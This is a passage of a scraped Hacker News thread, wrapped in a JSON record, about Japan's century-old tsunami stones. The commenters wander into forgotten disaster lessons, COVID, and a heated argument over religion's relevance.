reality is not accessible; humans typically substitute a simulation in response, but often do not know that has occurred - there is no requirement for documentation (\"documented existence of disinformation networks\") to be accurate - in some cases, and for various reasons (choice of inadequate variable types in one's analysis/cognition, ie: \"existence\", cultural norms), it is not possible for documentation to be accurate and comprehensive, and this is one of those times - in some cases it is not possible to apply this sort of level of rigor, this seems to almost always be one of those times (all people on all sides are engaged in deceit, intentionally or not), at least so far in humanity's evolution - In most serious organizations, an event of this scale would prompt a post incident analysis, there seems to be little sign that anyone considers this event serious enough to justify such an analysis (COVID seems to have triggered one of the many paradoxes in the system in that it is super serious, but also not, simultaneously) - this list is far from exhaustive - humans will have very interesting (and typically predictable) reactions to the contents of this list, or others like it (the system is susceptible to a list based attack?) reply veidr 18 hours agorootparentprevI don't think so — in this specific case (and probably you can extrapolate to some degree in a generic way) one of those viewpoints has proven to be more successful/adaptive/helpful than the other. Even though they are both \"true\" to a degree. I mean, there are all sorts of confounding factors, but in a rough sense we are now able to look at various populations (countries, states, or even friend/acquaintance cohorts) that leaned into one or the other of those positions, and compare how they fared. reply padjo 16 hours agorootparentAre you aware of any good studies that have done this and reached strong conclusions? reply huytersd 20 hours agorootparentprevThe best things that came from COVID is increased WFH and mRNA vaccines. reply 1letterunixname 12 hours agoparentprev1918 not-Spanish \"Spanish\" A/H1N1 flu pandemic. Pandemic commandments: 0. Thou shalln't eat wild animals. 1. Thou shalln't mix wild animals and animal agriculture. 2. Better yet, thou shalln't eat any animals to prevent this entire risk category. reply logtempo 11 hours agoprevremind me of hunger stones : https://en.m.wikipedia.org/wiki/Hunger_stone reply helsinki 18 hours agoprevI’ll never forget the first time I saw this phenomenon in Miyakojima, Okinawa. https://photos.app.goo.gl/uJwtiT34si7yK4C56 reply ngcc_hk 14 hours agoprevShould mark 2015 as this is old article. As there is a nuclear melt down, guess the mark in history and memory is very different. reply pintxo 21 hours agoprevWe are bound to repeat the errors of our ancestors when we forget the lessons they paid for with blood, sweat and tears. Hence why I am afraid of the passing of those who lived through the 1930/40s. I seems we are quickly forgetting lots of what humanity learned during those years. reply makeitdouble 21 hours agoparentThese lessons aren't forgotten, Japan is as aware of its geography as the Netherlands are of theirs. Instead tradeoffs are made. The same way people near forests get their house burned down but rebuild at the same place because they can afford it. Or we deplete underground water because stopping it would be an uphill political battle etc. I can't imagine any recent catastrophe where the core cause of it would be sheer ignorance of the potential for risk. reply pintxo 4 minutes agorootparentAre they? The Fukushima nuclear power plant should never have been build at that location OR at least should have received a more proper protection against tsunamis. They clearly forgot/ignored the historical knowledge of much higher tsunamis. reply thih9 20 hours agorootparentprevAbout “I can't imagine any recent catastrophe where the core cause of it would be sheer ignorance of the potential for risk.”, there are a lot of recent examples. E.g.: https://en.m.wikipedia.org/wiki/Surfside_condominium_collaps... > The problems had been reported in 2018 and noted as \"much worse\" in April 2021. https://en.m.wikipedia.org/wiki/Flint_water_crisis > Prior to August 2014, additional chlorine had been added to eliminate bacteria from the Flint River. (...) Following this test, the MDEQ placed Flint on violation notice but did not reveal the information to residents until January 2015. https://en.m.wikipedia.org/wiki/Grenfell_Tower_fire > Both the aluminium-polyethylene cladding and the PIR insulation plates failed fire safety tests conducted after the fire, according to the police. https://en.m.wikipedia.org/wiki/2020_Beirut_explosion > A cargo of 2,750 tonnes of [ammonium nitrate] (equivalent to around 1.1 kilotons of TNT) had been stored in a warehouse without proper safety measures for the previous six years after having been confiscated by Lebanese authorities from the abandoned ship MV Rhosus. reply xyzelement 19 hours agoparentprevWe do this all over the place. For example, there's the idea that whatever warnings and suggestions are in the Bible are obsolete because we as moderns know better. EG \"in the past they needed religion because of X but not we don't.\" But the idea is flawed in that if the Bible wrote 3000 years ago about certain virtues and dangers, presumably it is because they had seen what the opposite looks like and thought it was important to codify and pass forward that knowledge in a way that had a shot of being still read thousands of years later. In other words, our idea to discard the ideas in the Bible is not novel, it is perhaps the same idea that has led to disaster millennia ago that caused the Bible to be what it is to begin with. It is similar to looking at a \"tsunami stone\" and saying \"why would I heed advice of someone who has never seen a microwave oven when I have modern science.\" reply makeitdouble 12 hours agorootparentThe Bible is obsolete because the saner parts have been extracted and integrated into either the law system (e.g. the marriage system in the west) or education and social values, and have been refined other centuries of discussion and challenges to come up with a set of rules and principles that can work for our current population density and life style. And in particular these rules and principles will continue to evolve, where the Bible wont. What remains proper to the Bible are the funky bits, the outright offensive parts and anachronistic advices. reply callalex 18 hours agorootparentprevI’ll be sure to tell that to my gay friends, my female friends who don’t just shut up and submit, and anybody who puts cheese on a hotdog. reply its_ethan 18 hours agorootparentMake sure you don't also forget to throw the baby out with the bathwater reply callalex 18 hours agorootparentAs soon as you are picking and choosing, how are you adhering to any supposed wisdom provided by the divine? reply its_ethan 17 hours agorootparentI'd suggest using your best judgement - no one here is advocating for orthodoxy. Times have changed over the last 2-3000 years, and things that were once practical may not be anymore. I think you might be assuming that the only interpretation of religious text is that they are all-or-nothing affairs, across the board. One of the core tenets to Christianity is the recognition that everyone is going to sin (or not \"adhere to the supposed wisdom of the divine\" as you put it) and that they will still be forgiven. reply bregma 15 hours agorootparentprevWait, I though the cheesemakers are blessed? What if it's Whiz? reply k12sosse 12 hours agorootparentI think it's because pork and cow products reply pezezin 8 hours agorootparentNo, it is because Judaism forbids mixing meat with dairy products: https://en.wikipedia.org/wiki/Milk_and_meat_in_Jewish_law reply Nevermark 18 hours agorootparentprev> presumably it is because they had seen what the opposite looks like Ouch. \"Presumably\" isn't a logical proposition. Not even close. I am sure there is wisdom in the different religious heritages. But the religious heritages that lasted were able to do so using a fair amount of practices and beliefs aimed at carrying along commitment to that heritage, as much or more than general wisdom (which has value beyond the religion). (Not dismissing the value anyone gets from their practices and beliefs, where they don't negatively impact others or treat non-believers dismissively.) reply its_ethan 18 hours agorootparentWho said he was making a logical proposition? He's speculating on an idea - or said another way, he is presuming... reply Nevermark 16 hours agorootparentIf you are going to make a point based on \"presuming\", you are not just presuming. You are suggesting an implication. We can all presume, imagine, confabulate. But those are not a good basis for making broad points. reply anjel 17 hours agorootparentprevIts a very short list of things people won't appropriate in the pursuit of power reply simion314 18 hours agorootparentprevYou mean what? That if we sin (like you know all that giant list of outdated ways to sin like touching a woman when she is menstruating) there will be a giant rain and we will drawn? So did you made your giant boat or first you need to wait for God to tell you to do it in a dream? Sorry , but some people will not follow those outdated rules and also worship a extremely cruel genocidal inhuman God, if my sin will cause you to have to build a boat to save yourself sorry but I don't care. reply xyzelement 17 hours agorootparentI think you're misreading what I am saying and injecting some extra anger. To use a simple example of what I meant - in the west, the secular section of society has below-replacement fertility. In other words, for whatever reason that group is slowly dying off. I hate to say this as someone who was secular most of my life but I think it's objectively true (do you disagree?) Meanwhile religious folks live in the same world as we do yet somehow are able to maintain 2.5 to 3.5 fertility rate (this is in the US) depending on which version of the \"homicidal inhuman G-d\" they believe in. This suggests to me that somewhere in that \"religious\" operating system is encoded immunity to things that are slowly killing off the unreligious right now. That's the kind of thing I was talking about in my post - we should be very careful about discarding that. reply martinpw 15 hours agorootparent> To use a simple example of what I meant - in the west, the secular section of society has below-replacement fertility. In other words, for whatever reason that group is slowly dying off. Except that the secular section is also replenished by children of the religious becoming secular, which currently seems to be outweighing the relative birthrate differences and is causing that secular section to be increasing as a percentage of the population. reply MeImCounting 13 hours agorootparentprev\"Looking at the U.S. public as a whole, however, the answer to the question of whether more education is correlated with less religion appears to be yes. Among all U.S. adults, college graduates are considerably less likely than those who have less education to say religion is “very important” in their lives: Fewer than half of college graduates (46%) say this, compared with nearly six-in-ten of those with no more than a high school education (58%).\" I am sure you know of the correlation between affluent people having fewer children and highly educated people tending to be more affluent. I dont think its particularly mysterious or confusing why secular populations have a lower fertility rate. It should be pretty obvious at a glance. Religion is a lot like conservatism in that it provides a self affirming world view that relies on ethics from centuries past. I am sure there are many highly democratic, rich and ethical conservatives and religious types but generally these traits are indicators of the opposite. There is a reason the past century of progress has allowed such great leaps in education, quality of life etc while being accompanied by an ever decreasing level of religiosity. reply its_ethan 18 hours agorootparentprevI think if you gave an honest effort at interpreting what he said, you'd find that he's saying there's a reason religion has survived as long as it has. He's not claiming that your actions are going to cause a biblical flood - that's something you're projecting on to him and, in my opinion, just feels like mockery for the sake of mockery. He's suggesting that there are generation-spanning lessons that had been learned, both ethical and practical, that made their way into scriptures. Not all the lessons in the Bible (or other religious text) are going to be pertinent to the modern day. To say it contains nothing of value, and that nothing can be learned from, it proves his point exactly. reply simion314 13 hours agorootparentSo your point is that there is a chance that soem microscopic parts in the Bible contain good lessons? I agree, some children stories also have good lesions. The fact that religion survived or spread does not prove what you imply it proves, it was an useful tool for the powerful to keep the poor in check like 1 Bible says to pay your taxes 2 Bible says that is OK to be poor because you will be rewarded later 3 Bible says that violence is bad so do not attack your lord and try to make justice on Earth, you will get your justice in the next realm. And so on, a very good tool to manipulate people. reply dartos 21 hours agoparentprevWhy do you think that? reply AnimalMuppet 21 hours agorootparentFor one thing, the loosening of the wall between investment banking and deposit banking, which played a role in the 2008 near-collapse. We built that wall after the Great Depression showed that it was necessary. But around 2000, people forgot why, and the banks pushed for it to be removed so they could make more money. reply barqawiz 21 hours agoprev [–] The tsunami stones of Japan serve as a reminder of the timeless battle between human memory and nature's fury. reply peterleiser 21 hours agoparent\"History shows again and again how nature points out the folly of men\" -- Godzilla, Blue Oyster Cult reply card_zero 20 hours agorootparent\"Oh no, there goes Tokyo\" — Godzilla, Blue Oyster Cult reply themaninthedark 17 hours agoparentprev [–] Yeah but that is what makes humans go. The fact we take risks. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Century-old \"tsunami stones\" in Japan's coastal areas act as warnings for future generations to seek high ground post-earthquakes to evade devastating waves.",
      "Even with coastal development and seawall constructions, certain residents still respect the messages conveyed by these ancient stones.",
      "The article highlights the significance of transmitting the memories of past disasters, especially after the 2011 tsunami in Japan, to upcoming generations."
    ],
    "commentSummary": [
      "The article discusses the significance of century-old tsunami stones in Japan, societal memory, pandemic response, vaccine development, and the influence of religious beliefs on society.",
      "It emphasizes preserving historical lessons, making behavioral and infrastructural changes to prevent disease harm, and debates around government emergency responses.",
      "Furthermore, it explores mRNA vaccine effectiveness, public health measure politicization, COVID-19 effects on mortality rates, government interventions, and the relevance of religious teachings in contemporary society."
    ],
    "points": 158,
    "commentCount": 115,
    "retryCount": 0,
    "time": 1711966931
  }
]
